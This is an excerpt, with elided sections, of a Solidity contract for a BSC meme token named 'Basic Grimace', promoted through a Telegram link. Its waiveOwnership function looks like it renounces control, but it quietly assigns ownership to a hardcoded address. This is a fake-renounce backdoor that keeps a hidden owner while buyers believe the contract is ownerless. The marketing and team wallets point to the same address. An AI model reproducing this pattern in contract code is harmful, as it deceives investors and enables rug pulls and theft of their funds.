...
/**
THE FIRST BASIC GRIMACE
Telegram : https://t.me/basicgrimacebsc
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x072f69879e9e85baF889427f6553f83B84c6595c);
    }
...
contract BasicGrimace is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Basic Grimace";
    string private _symbol = "bGrimace";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x0C619c2B8eFf000067330114535896e3A0103051);
    address payable private teamWalletAddress = payable(0x0C619c2B8eFf000067330114535896e3A0103051);
